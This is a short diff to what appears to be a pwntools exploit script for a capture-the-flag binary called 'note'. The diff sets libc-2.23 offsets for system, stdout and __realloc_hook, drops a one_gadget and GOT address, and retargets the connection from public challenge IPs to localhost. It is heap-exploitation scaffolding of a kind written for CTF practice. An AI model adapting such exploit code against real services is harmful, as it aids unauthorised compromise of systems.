@@ -7,21 +7,12 @@ context.log_level = "debug"
 elf = "./note"
 ENV = {"LD_PRELOAD":"./libc-2.23.so"}
 
-unsorted_bin_off = 0x3c4b78
 system_off = 0x45390
 stdout_off = 0x3c48e0
 realloc_hook_off = 0x3c4b08 
-one_gadget_off = 0
 
-realloc_got_addr = 0x601fa0
-
-if len(sys.argv) > 1:
-    one_gadget_off = int(sys.argv[1])
-
-#p = remote("localhost", 1234)
-#p = remote("182.254.230.85", 1234)
+p = remote("localhost", 1234)
 #p = remote("172.22.224.113", 1234)
-p = remote("39.107.14.183", 1234)
 
 def change_title(s):
     p.recvuntil("option--->>\n")
